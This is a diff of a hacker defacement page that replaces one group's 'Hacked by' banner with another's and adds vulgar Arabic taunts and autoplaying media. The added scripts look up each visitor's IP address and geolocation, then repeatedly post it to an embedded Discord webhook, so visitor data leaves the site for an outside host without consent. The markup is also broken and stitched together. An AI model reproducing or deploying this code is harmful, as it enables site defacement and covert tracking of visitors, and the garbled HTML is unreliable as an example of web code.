@@ -1,19 +1,19 @@
 <!DOCTYPE html>
-<html>
-<head>
-	<title>Abdosf & OnlyDaw</title>
-	<style>
-		body {
-			background-color: #000000; /* black background */
+<!-- saved from url=(0029)https://50sh.github.io/index/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>CALLME</title>
+  <style>
+    body {
+      background-color: #000000; /* black background */
             margin: 0;
       padding: 0;
       width: 100%;
       height: 100vh;
       overflow: hidden;
-		}
-     
-   
-    
+    }
+
+
+
     video {
       position: absolute;
       top: 0;
@@ -21,26 +21,58 @@
       width: 100%;
       height: 100vh;
       object-fit: cover;
+      PLAY: autoplay;
     }
- 
-	</style>
+
+
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Changing Photo Every Second</title>
+<style>
+    #photo {
+        width: 100%;
+        max-width: 500px;
+        height: auto; /* Corrected height to auto for maintaining aspect ratio */
+    }
+</style>
 </head>
 <body>
-    <p align="center">
-        <img border="0" src="https://cdn.discordapp.com/avatars/1187486097874370630/fd3f0d1699bdb58e8e4d0507cb27760a.webp?size=4096&format=webp&width=670&height=670" width="device-width" height="200">
-    </p>
-   
 
-   
-    
+<img id="photo" src="c:\Users\Administrator\Downloads\image.png" alt="Photo">
 
- 
+<script>
+    const photos = [
+        "https://cdn.discordapp.com/attachments/1166669805768679495/1264836924116566088/image.png?ex=669ffb6e&is=669ea9ee&hm=686b498d54f0ffb58410588a6c51ae8dc8b3ce5a498b178f8d3bf61155a3979d&",
+        "https://cdn.discordapp.com/avatars/1072701097350795375/27252841227e78983dc8d898b1ae8c35.png?size=1024",
+        // Add more photo URLs as needed
+    ];
+
+    let currentPhotoIndex = 0;
+    const photoElement = document.getElementById('photo');
+
+    function changePhoto() {
+        photoElement.src = photos[currentPhotoIndex];
+        currentPhotoIndex = (currentPhotoIndex + 1) % photos.length; // Loop back to the start
+    }
+
+    // Call changePhoto function every second (1000 milliseconds)
+    setInterval(changePhoto, 1000);
+</script>
+
+ </body>
+ </html>
+
+
+
+
+
 <script>
     var names = [
-        { name: "[ Abdosf & OnlyDaw ]", color: "red" },
 
 
-    ];
 
     var nameIndex = 0;
 
@@ -56,22 +88,52 @@
 </script>
 
 <p align="center">
-    <font face="Courier" size="6" style="color: #000000;">
-        <span style="color: rgb(255, 0, 0);">Hacked </span>
-        <span id="name" style="color: white;">[ Abdosf & OnlyDaw ]</span>
-    </font>
-</p>
-<p align="center">
-    <b>
-<font face="Courier" color="#000000">
-<a href="https://discord.gg/Ce7vCqtYj4" style="font-size: 24px; color: rgb(255, 255, 255); text-decoration: none;">Discord.gg/Abdosf & OnlyDaw</a>
+
+
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Change Name Every Second with Custom Color</title>
+<style>
+
+BODY {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding-top: 50px;
+}
+</style>
+</head>
+<body>
+
+
+<h1 id="nameDisplay">CALLME</h1>
+
+<script>
+
+  const namesAndColors = [
+    { name: "Hacked by [EXE.CALLME]", color: "BLACK" },
+    { name: "Hacked by [exe.6.eldokSH]", color: "RED" },
+
+  ];
+
+  let index = 0;
+
+  // Function to change the name every second
+  function changeName() {
+    document.getElementById("nameDisplay").textContent = namesAndColors[index].name;
+    document.getElementById("nameDisplay").style.color = namesAndColors[index].color;
+    index = (index + 1) % namesAndColors.length; // Move to the next name, wrap around if needed
+  }
+
+
+  changeName();
+  setInterval(changeName, 1000); // Change name every 1 second (1000 milliseconds)
+</script>
 
 
 
-</font>
 
-    </b>
-</p>
 
 
 
@@ -110,7 +172,7 @@
             font-size: 9px;
             font-family: Arial, sans-serif;
             white-space: nowrap;
-            position: absolute;
+            position: static;
             animation: scrollText 20s linear infinite;
             transform: translateX(100%);
             -webkit-text-stroke: 1px rgb(255, 255, 255);
@@ -142,7 +204,7 @@
         }
 
         .cmd-text:hover {
-            animation-play-state: paused;
+            animation-play-state: PLAY;
         }
 
         video {
@@ -150,20 +212,18 @@
             top: 0;
             left: 0;
             z-index: -1;
-            filter: blur(10px);
+
         }
 
         /* Hide the audio controls */
-        audio {
-            display: none;
-        }
+        audio
     </style>
 
 
-    
 
 
-    <meta charset="UTF-8">
+
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Animated Text</title>
     <style>
@@ -179,7 +239,7 @@
     </style>
 
 
-    <h3 class="animated-text">Abdosf & OnlyDaw Passed From Here</h3>
+    <h3 class="animated-text">جاهزين تتناكو ؟</h3>
 
 
     <p id="ip-address">
@@ -190,49 +250,157 @@
     <h3 style="color: rgb(255, 255, 255); animation: flashing 1s infinite;">Your IP Info :</h3>
     <pre id="ip-info" class="json-data">Unable to fetch IP information.</pre>
     <div class="cmd-text-container" style="position: relative; top: -15px;">
-        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;"> You have got hacked by Abdosf & OnlyDaw </div>
+        <div class="cmd-text" style="font-size: 19px; text-stroke: 20px black; color: black;">  تـــــــم النيـــــــك </div>
     </div>
 
     <!-- Hidden audio element with autoplay -->
+
+
+
+
+    <html lang="en">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autoplay Video with Sound</title>
+    </head>
+    <body>
+      <video autoplay muted LOOP>
+        <source src="https://cdn.discordapp.com/attachments/1166669805768679495/1265074516887863366/2024-07-21_23-35-43_1.mp4?ex=66a02ff4&is=669ede74&hm=fec063a17b27ec324fda0e814581201d45ac3a5a3ddb9ce77e36cc9bb9d7e3e0&" type="video/mp4">
+        <!-- You can add additional source elements for different formats -->
+        Your browser does not support the video tag.
+      </video>
+
+      <audio autoplay LOOP>
+        <source src="https://cdn.discordapp.com/attachments/1166669805768679495/1265074157025103872/2024-07-21_23-35-43_1.mp3?ex=66a02f9e&is=669ede1e&hm=aeccd58caad46bfde513a64209ea1f845d5b64decf500741fb30e775c1f1852e&" type="audio/mpeg">
+            <!-- You can add additional source elements for different audio formats -->
+            Your browser does not support the audio tag.
+        </audio>
+    </body>
+    </html>
+    <h2 style="color: #ffffff;">Feedback</h2>
+    <form id="messageForm">
    
+    <label for="message">Message:</label><br>
+    <label for="message" style="color: #ffffff;">Message:</label><br>
+    <input type="text" id="message" name="message"><br><br>
+    <button type="submit">Send Message</button>
+</form>
 
-<video style="width: 100vw; height: 100vh;"  controls autoplay="" loop="" >
-    <source src="1.mp4">
+<script>
+    // Function to handle form submission
+    document.getElementById('messageForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent the form from submitting and reloading the page
 
+        // Get input value
+        const message = document.getElementById('message').value.trim();
 
-
-
-    <script>
-        // JavaScript code to fetch and display the user's IP address and information
-        function fetchIPAndInfo() {
-            fetch('https://api.ipify.org/?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('ip-address-value').textContent = data.ip;
-                    return data.ip;
-                })
-                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
-                .then(response => response.json())
-                .then(ipInfoData => {
-                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
-                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
-                });
+        if (message === '') {
+            alert('Message cannot be empty.'); // Show an alert if the message is empty
+            return;
         }
 
-        // Fetch IP address and information initially
-        fetchIPAndInfo();
-    </script>
+        // Send the message to Discord
+        feedback(message);
+    });
+
+    // Function to send message to Discord
+    function feedback(message) {
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1265115299783381033/BZ8l-g0AaTyyy2RTWTkzry9xtA01ZsnkUVnSZykrqHe-mQkoFph3HRsM5AUh_KCo1-DH';
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: message }),
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            console.log('Message sent successfully to Discord:', message);
+            alert('thanks callme');
+            document.getElementById('message').value = ''; // Clear the message input field
+        })
+        .catch(error => {
+            console.error('Error sending message to Discord:', error);
+            alert('Error sending message to Discord. Please try again later.');
+        });
+    }
+</script>
 
 
-</video>
+
+<!-- Script to fetch IP address and information -->
+<script>
+    
+    // Function to fetch IP address and information
+    function fetchIPAndInfo() {
+        fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip-address-value').textContent = data.ip;
+                return data.ip;
+            })
+            .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+            .then(response => response.json())
+            .then(ipInfoData => {
+                document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                // Once IP info is fetched, start sending messages
+                autoSendMessages();
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+            });
+    }
+
+    // Function to send a message to Discord
+    function sendMessage(message) {
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1265115299783381033/BZ8l-g0AaTyyy2RTWTkzry9xtA01ZsnkUVnSZykrqHe-mQkoFph3HRsM5AUh_KCo1-DH';
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: message }),
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            console.log('Message sent successfully:', message);
+        })
+        .catch(error => console.error('Error sending message:', error));
+    }
 
 
 
 
-	
+
+
+    // Function to send a message containing IP info every 5 seconds
+    function autoSendMessages() {
+        setInterval(() => {
+            // Prepare message with IP info
+            const message = `IP Address: ${document.getElementById('ip-address-value').textContent}\nIP Info: ${document.getElementById('ip-info').textContent}`;
+            
+            // Send message to Discord
+            sendMessage(message);
+        }, 1111000); // Send a message every 5 seconds (5000 milliseconds)
+    }
+
+    // Initial fetch of IP address and information
+    fetchIPAndInfo();
+
+
+  
+    
+
+</script>
+
 </body>
 </html>
